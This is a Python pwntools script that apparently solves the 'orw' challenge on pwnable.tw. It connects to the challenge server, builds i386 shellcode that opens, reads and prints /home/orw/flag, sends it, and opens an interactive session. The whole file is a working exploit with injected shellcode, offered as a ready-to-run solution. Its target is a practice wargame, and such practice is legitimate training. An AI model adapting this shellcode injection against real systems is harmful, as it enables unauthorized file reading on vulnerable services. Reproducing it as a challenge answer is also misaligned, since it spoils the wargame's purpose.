#coding=utf8
from pwn import *
context.arch = "i386"
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./orw')
	bin = ELF('./orw')
else:
	cn = remote('chall.pwnable.tw', 10001)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


cn.recv()

shellcode=asm(
	shellcraft.pushstr("/home/orw/flag") + 
	shellcraft.open("esp", 0, 0) + 
	shellcraft.read('eax', 'esp', 0x30) + 
	shellcraft.write(1, 'esp', 0x30)
)
cn.sendline(shellcode)



cn.interactive()